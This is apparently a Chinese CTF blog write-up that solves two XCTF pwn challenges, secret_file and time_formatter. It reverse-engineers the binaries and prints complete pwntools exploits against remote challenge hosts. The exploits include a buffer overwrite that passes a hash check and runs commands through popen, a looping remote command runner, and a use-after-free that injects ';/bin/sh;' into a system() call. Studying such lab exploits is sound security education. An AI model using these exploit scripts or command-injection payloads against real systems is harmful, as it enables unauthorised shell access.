---
title: XCTF-Pwn-Advance-2
date: 2020-08-10 15:35:53
cover: https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/AdvanceCover.png
tags: 
 - CTF
 - PWN
---

# secret_file

*这道题真的是折腾我了好久。*

64位，保护全开

![QQ20200810-0](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/Xctf2/secret_file/QQ20200810-0.jpeg)

主函数是这样的。程序比较复杂，逆向基础不好的我受到了很大阻碍。直接连接程序的结果是，执行一次输入，然后返回密码错误。

阅读代码，在line 25有一个getline，这个函数的作用是输入，知道输入中断或接收到换行符。

听起来就是没有限制的输入。**因此这里可能会造成溢出**。*（这里说没有限制是不严谨的。getline会允许输入至所给变量空间的上限。然而如果给的地址是NULL，则会自行malloc空间。此时的空间会根据输入的长度决定。本题的所给空间在line 24被赋值为空。）*

line 29～30的主要作用是判断输入的字符串是否正确结尾，若没有正确结尾（换行符）则退出。

line 33把输入的字符串复制给了dest。

接着就进入了DD0函数。

![截屏2020-08-10 下午3.50.03](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/Xctf2/secret_file/%E6%88%AA%E5%B1%8F2020-08-10%20%E4%B8%8B%E5%8D%883.50.03.png)

line 13是在初始化v5，为接下来的hash计算做准备。

line 14对Input进行了hash的前0x100字节进行了hash运算。（Input就是dest，0x100等于256）并将结果储存在了v5。

line 15把v5的值给了\_v16。（简单描述）

回到主函数，line 35～42进行了一段意义不明的循环。（路过大佬求告知）

在line 44进行了一次比对，比对了v15与v17是否相等。相等则会调用popen函数。

popen函数的v14变量是命令，第二个参数为读写模式。这个函数能起shell并执行v14的命令。所以我们要想办法把利用v14读取flag。

观察栈分布，dest是在v14，v15，v17之上的，全部都可以被我们覆盖。

比对的话呢，是把我们输入的payload的前0x100个字节给hash加密然后和v15储存的比对了。所以我们可以构造payload=padding+shellcode+hash(padding)把v15覆盖为v17的值来通过比对。

*（这里是忽略了迷之循环的作用，把v17简单当作了hash加密后的结果，即v16）*

最终exp。

```python
from pwn import *
import hashlib  
res = remote('220.249.52.133',42875)
padding = 'a'*0x100
payload = padding + 'cat flag.txt;'.ljust(0x1B,' ') + hashlib.sha256(padding).hexdigest()
res.sendline(payload)
print(res.recv())
```

另附：网上有师傅给出了v17的正确求法。

```python
#coding:utf-8
 
from pwn import *
import hashlib
 
#context.log_level = 'debug'
 
debug = 1
 
 
def exp(string, debug):
	if debug == 1:
		r = process('./secret_file')
		#gdb.attach(r)
		#pause
	else:
		r = remote('111.198.29.45', 37598)
 
 
	payload = 'a' * 0x100
 
	memory = ''
 
	sha256 = hashlib.sha256(payload).hexdigest()
 
	for i in range(0, len(sha256), 2):
		memory = memory + chr(int(sha256[i:i + 2], 16))
 
	memory = list(memory + '\x00' * 0x41)
 
	for i in range(0x20):
		tmp = '%02x'%ord(memory[i]) + '\x00'
		memory[0x20 + 2 * i] = tmp[0]
		memory[0x20 + 2 * i + 1] = tmp[1]
		memory[0x20 + 2 * i + 2] = tmp[2]
 
	v15 = ''.join([i for i in memory[0x20:-1]])
	
	'''
		string中不要用\x00填充
		payload = payload + (string + ';#').ljust(0x1f8 - 0x1dd, '\x00') + v15 + '\n'
		否则strcpy的时候会进行截断，v15无法正常输入
	'''
 
	'''
		v15后面不要跟\x00
		payload = payload + (string + ';#').ljust(0x1f8 - 0x1dd, ' ') + v15 + '\x00\n'
		否则strrchr的时候，str会以\x00作为结尾，则\n被截断
	'''
 
	payload = payload + (string + ';#').ljust(0x1f8 - 0x1dd, ' ') + v15 + '\n'
 
	r.send(payload)
	
	log.info('%s\n'%r.recv())
	r.close()
	
 
while True:
	print '[*] $ ',
	command = raw_input()[:-1]
	if command == 'exit':
		break
	exp(command, debug)	
```

[原文链接](https://blog.csdn.net/Eagle_hwei/article/details/104292736)

# time_formatter

*这是本系列文章第一道堆pwn。*

64bit 除pie外保护全开

看主函数

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __gid_t v3; // eax
  FILE *v4; // rdi
  __int64 v5; // rdx
  int v6; // eax

  v3 = getegid();
  setresgid(v3, v3, v3);
  setbuf(stdout, 0LL);
  puts("Welcome to Mary's Unix Time Formatter!");
  do
  {
    while ( 2 )
    {
      puts("1) Set a time format.");
      puts("2) Set a time.");
      puts("3) Set a time zone.");
      puts("4) Print your time.");
      puts("5) Exit.");
      __printf_chk(1LL, "> ");
      v4 = stdout;
      fflush(stdout);
      switch ( sub_400D26() )
      {
        case 1:
          v6 = sub_400E00();
          break;
        case 2:
          v6 = sub_400E63();
          break;
        case 3:
          v6 = sub_400E43();
          break;
        case 4:
          v6 = sub_400EA3((__int64)v4, (__int64)"> ", v5);
          break;
        case 5:
          v6 = sub_400F8F();
          break;
        default:
          continue;
      }
      break;
    }
  }
  while ( !v6 );
  return 0LL;
}
```

主函数看起来就是堆pwn该有的样子。

先看下case 1的sub_400E00函数

```c
__int64 sub_400E00()
{
  char *v0; // rbx

  v0 = sub_400D74();
  if ( (unsigned int)sub_400CB5(v0) )
  {
    ptr = v0;
    puts("Format set.");
  }
  else
  {
    puts("Format contains invalid characters.");
    sub_400C7E(v0);
  }
  return 0LL;
}
```

再深入看一下sub_400D74

```c
char *sub_400D74()
{
  __int64 v0; // rdx
  __int64 v1; // rcx
  char s[1024]; // [rsp+8h] [rbp-410h]
  unsigned __int64 v4; // [rsp+408h] [rbp-10h]

  v4 = __readfsqword(0x28u);
  __printf_chk(1LL, "%s");
  fflush(stdout);
  fgets(s, 1024, stdin);
  s[strcspn(s, "\n")] = 0;
  return PutStr2NewAddr(s, (__int64)"\n", v0, v1);
}
```

这里有一个被我改过名字的函数PutStr2NewAddr，这个函数的作用和名字一样，把一个字符串放进新申请的地址里。

看下这个函数的细节

```c
char *__fastcall sub_400C26(const char *a1, __int64 a2, __int64 a3, __int64 a4)
{
  char *NewAddr; // rax
  char *v5; // rbx
  __int64 v7; // [rsp-8h] [rbp-18h]

  v7 = a4;
  NewAddr = strdup(a1);
  if ( !NewAddr )
    err(1, "strdup", v7);
  v5 = NewAddr;
  if ( getenv("DEBUG") )
    __fprintf_chk(stderr, 1LL, "strdup(%p) = %p\n", a1, v5);
  return v5;
}
```

line 8有个strdup函数，这个函数会malloc一块地址，并把字符串放入。

sub_400E00函数还调用了一个sub_400cb5函数。这个函数的主要作用是检查用户输入

```c
_BOOL8 __fastcall sub_400CB5(char *s)
{
  char accept; // [rsp+5h] [rbp-43h]
  unsigned __int64 v3; // [rsp+38h] [rbp-10h]

  strcpy(&accept, "%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# ");
  v3 = __readfsqword(0x28u);
  return strspn(s, &accept) == strlen(s);
}
```



```C
__int64 sub_400E63()
{
  int v0; // eax
  const char *v1; // rdi

  __printf_chk(1LL, "Enter your unix time: ");
  fflush(stdout);
  v0 = sub_400D26();
  v1 = "Unix time must be positive";
  if ( v0 >= 0 )
  {
    dword_602120 = v0;
    v1 = "Time set.";
  }
  puts(v1);
  return 0LL;
}
```

case2对应的函数没有堆相关操作，是接受用户输入时间的函数。

再看case 3的sub_400E43

```c
__int64 sub_400E43()
{
  value = sub_400D74();
  puts("Time zone set.");
  return 0LL;
}
```

同样是调用了sub_400D74函数。所以选项3也会进行malloc。

接着是重要的case 4。

```c
__int64 __fastcall sub_400EA3(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // r8
  char command; // [rsp+8h] [rbp-810h]
  unsigned __int64 v6; // [rsp+808h] [rbp-10h]

  v6 = __readfsqword(0x28u);
  if ( ptr )
  {
    __snprintf_chk(&command, 2048LL, 1LL, 2048LL, "/bin/date -d @%d +'%s'", (unsigned int)dword_602120, ptr, a3);
    __printf_chk(1LL, "Your formatted time is: ");
    fflush(stdout);
    if ( getenv("DEBUG") )
      __fprintf_chk(stderr, 1LL, "Running command: %s\n", &command, v3);
    setenv("TZ", value, 1);
    system(&command);
  }
  else
  {
    puts("You haven't specified a format!");
  }
  return 0LL;
}
```

这个函数把ptr指针指向的字符串进行格式化并放入system执行。我们很容易想到如果能控制ptr进行命令注入就可以get shell。

到目前还没有找到明显的漏洞，当然我们都知道pwn题常常会在退出时出幺蛾子。

关键的case 5

```c
signed __int64 sub_400F8F()
{
  signed __int64 result; // rax
  char s; // [rsp+8h] [rbp-20h]
  unsigned __int64 v2; // [rsp+18h] [rbp-10h]

  v2 = __readfsqword(0x28u);
  sub_400C7E(ptr);
  sub_400C7E(value);
  __printf_chk(1LL, "Are you sure you want to exit (y/N)? ");
  fflush(stdout);
  fgets(&s, 16, stdin);
  result = 0LL;
  if ( (s & 0xDF) == 89 )
  {
    puts("OK, exiting.");
    result = 1LL;
  }
  return result;
}
```

line 10到结尾是用户选择是否真的退出。关键点在line 8-9。

```c
void __fastcall sub_400C7E(void *ptr)
{
  __int64 v1; // r8

  if ( getenv("DEBUG") )
    __fprintf_chk(stderr, 1LL, "free(%p)\n", ptr, v1);
  free(ptr);
}
```

所以line 8-9释放了ptr和value两个指针。也就是说，当我们执行case 5后选择n就可以触发UAF漏洞。而ptr的值是在case 1中分配的，value是在case 3中分配的。

ptr被释放，所指向的地址存入了fastbin。此时我们再执行case 3就会把刚放进fastbin的地址给value，此时ptr和value都指向同一个地址。case 1对输入有限制，case 3没有限制，我们就成功利用UAF使ptr包含了 shellcode。

exp如下：

```python
# coding=utf-8
from pwn import *
context.log_level = 'debug'
# io = process('./time_formatter')
io =remote('220.249.52.133',38913)
#为ptr分配堆储存空间
io.recvuntil('> ')
io.sendline('1')
io.recvuntil('Format: ')
io.sendline('aaa')
# 释放ptr中的堆空间
io.recvuntil('> ')
io.sendline('5')
io.recvuntil('Are you sure you want to exit (y/N)?')
io.sendline('N')
# 为value分配堆，此时分配到的就是刚放入fastbin的地址
#写入shellcode
io.recvuntil('> ')
io.sendline('3')
io.recvuntil('Time zone: ')
io.sendline('\';/bin/sh;\'')
#利用命令注入拿shell
io.recvuntil('> ')
io.sendline('4')
print("shell")
io.interactive()
```

